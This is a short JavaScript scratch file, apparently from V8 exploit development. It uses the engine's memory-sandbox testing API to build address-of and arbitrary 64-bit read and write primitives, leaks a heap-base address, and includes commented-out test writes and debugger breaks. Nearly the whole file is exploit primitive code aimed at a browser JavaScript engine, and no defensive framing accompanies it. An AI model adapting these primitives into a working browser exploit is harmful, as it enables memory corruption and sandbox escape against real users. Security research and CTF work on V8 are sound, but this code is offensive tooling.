

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}

function sr_heap_base() {
  let buf = new ArrayBuffer(8);
  let u8arr = new Uint8Array(buf);
  return addrOf(u8arr);
}

let buf = new ArrayBuffer(8);
let u8arr = new Uint8Array(buf);

// search heap_base
// let ofs_u8arr = 0x40;
// let leak_addr = v8_read64(ofs_u8arr);

// console.log("addr[", ofs_u8arr.toString(16), "] = ", leak_addr.toString(16));
// addr[ 494a8 ] =  7250028380d


// heap_base
let ofs1 = 0x48;
let leak_addr = v8_read64(ofs1);
console.log("addr[", ofs1.toString(16), "] = ", leak_addr.toString(16));
// addr[ 48 ] =  236500040000

// %DebugPrint(u8arr);
%SystemBreak();

// v8_write64(addrOf(u8arr)+4, 0x414141414141n);
// %SystemBreak();

